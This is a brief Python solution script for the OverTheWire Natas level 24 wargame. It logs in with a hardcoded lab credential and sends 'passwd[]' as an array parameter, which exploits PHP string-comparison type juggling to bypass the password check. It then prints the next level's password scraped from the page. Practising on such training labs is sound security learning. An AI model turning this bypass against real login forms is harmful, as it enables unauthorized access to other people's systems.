import re
import requests
from requests.auth import HTTPBasicAuth 

def get_pass():
    auth = HTTPBasicAuth('natas24','OsRmXFguozKpTZZ5X14zNO43379LZveg')
    param = {'passwd[]':''}
    r = requests.get('http://natas24.natas.labs.overthewire.org/', auth=auth, params=param)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == '__main__':
    get_pass()
